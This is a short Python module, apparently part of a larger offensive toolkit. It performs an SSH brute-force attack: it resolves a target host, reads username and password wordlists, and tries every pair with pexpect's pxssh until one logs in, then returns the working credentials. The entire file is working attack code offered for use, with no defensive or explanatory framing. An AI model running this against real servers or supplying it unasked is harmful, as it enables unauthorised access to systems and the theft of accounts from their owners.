from __future__ import print_function
import pexpect
import time
import socket
from pexpect import pxssh

sshpass = []
sshuser = []

def sshbrute(web):

    try:
        ip = socket.gethostbyname(web)
        try:
            with open('app/views/module/file/dict/brute/ssh/ssh_user.lst','r') as users:
                for u in users:
                    u = u.strip('\n')
                    sshuser.append(u)

            with open('app/views/module/file/dict/brute/ssh/ssh_pass.lst','r') as pas:
                for p in pas:
                    p = p.strip('\n')
                    sshpass.append(p)
        except IOError:
            print(' [-] Importing wordlist failed!')

        for user in sshuser:
            for password in sshpass:
                try:
                    connect = pxssh.pxssh()
                    connect.login(ip,str(user),password)
                    if True:
                        return user,password
                except:
                    print(' [!] Checking ')

    except:
        print(' [-] Target seems to be down!')
